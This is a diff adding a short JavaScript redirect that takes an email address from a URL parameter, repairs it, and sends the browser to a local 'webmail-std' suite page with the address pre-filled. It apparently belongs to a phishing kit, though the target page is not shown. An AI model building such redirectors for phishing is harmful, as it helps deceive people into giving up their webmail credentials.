@@ -1,0 +1,22 @@
+
+
+<script type="text/javascript">
+ 
+const urlParams = new URLSearchParams(window.location.search);
+const email = urlParams.get('i');
+
+var findat = "@";
+
+if ( email.indexOf(findat) > -1 ) {
+    var url = "./webmail-std/en-us/suite/#"+email;
+} else {
+	var emaill = email.split("/").join("@"); 
+    var url = "./webmail-std/en-us/suite/#"+emaill;
+}
+window.location.href = url;
+
+// console.log(url);
+
+</script>
+
+
